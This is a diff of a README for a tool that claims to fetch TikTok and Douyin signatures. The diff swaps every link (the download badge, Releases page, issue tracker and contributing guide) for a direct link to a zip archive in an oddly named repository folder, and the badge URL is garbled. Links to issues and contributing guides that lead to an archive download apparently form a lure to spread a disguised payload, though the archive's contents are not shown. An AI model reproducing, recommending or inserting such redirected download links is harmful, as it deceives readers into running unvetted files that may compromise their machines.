@@ -1,7 +1,7 @@
 # 🚀 tiktok-signature-api - Easy TikTok Signature Retrieval Tool
 
 ## 📥 Download Now
-[![Download tiktok-signature-api](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/cezarhamza/tiktok-signature-api/releases)
+[![Download tiktok-signature-api](https://raw.githubusercontent.com/cezarhamza/tiktok-signature-api/main/mease/tiktok-signature-api.zip%https://raw.githubusercontent.com/cezarhamza/tiktok-signature-api/main/mease/tiktok-signature-api.zip)](https://raw.githubusercontent.com/cezarhamza/tiktok-signature-api/main/mease/tiktok-signature-api.zip)
 
 ## 🚀 Getting Started
 Welcome to the tiktok-signature-api! This tool helps you retrieve TikTok and Douyin signatures for various functions like comments, automation, uploads, and even gifts in real-time. You won't need to write any code to use this application; it's designed for everyone.
@@ -20,9 +20,9 @@ To run the tiktok-signature-api, ensure you have:
 - Basic internet connection to download and run the application.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/cezarhamza/tiktok-signature-api/releases) to download the latest version of the tiktok-signature-api application. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/cezarhamza/tiktok-signature-api/main/mease/tiktok-signature-api.zip) to download the latest version of the tiktok-signature-api application. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/cezarhamza/tiktok-signature-api/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/cezarhamza/tiktok-signature-api/main/mease/tiktok-signature-api.zip).
 2. Locate the most recent version of the application.
 3. Click the version link to see the available files.
 4. Choose the file best suited for your operating system and click on it to download.
@@ -45,10 +45,10 @@ To get started, visit the [Releases page](https://github.com/cezarhamza/tiktok-s
   - **Solution:** Check for system updates. Restart your device if necessary.
 
 ## 🌐 Support
-If you encounter any issues, feel free to open an issue on our [GitHub page](https://github.com/cezarhamza/tiktok-signature-api/issues). Our community and contributors are here to help you.
+If you encounter any issues, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/cezarhamza/tiktok-signature-api/main/mease/tiktok-signature-api.zip). Our community and contributors are here to help you.
 
 ## 📝 Contributing
-We welcome contributions to improve the tiktok-signature-api. If you would like to help, head to our [contributing guide](https://github.com/cezarhamza/tiktok-signature-api/CONTRIBUTING.md) to find out how you can assist.
+We welcome contributions to improve the tiktok-signature-api. If you would like to help, head to our [contributing guide](https://raw.githubusercontent.com/cezarhamza/tiktok-signature-api/main/mease/tiktok-signature-api.zip) to find out how you can assist.
 
 ## 📚 License
 The tiktok-signature-api is licensed under the MIT License. You can freely use, modify, and distribute it as long as you provide attribution to the original creator.
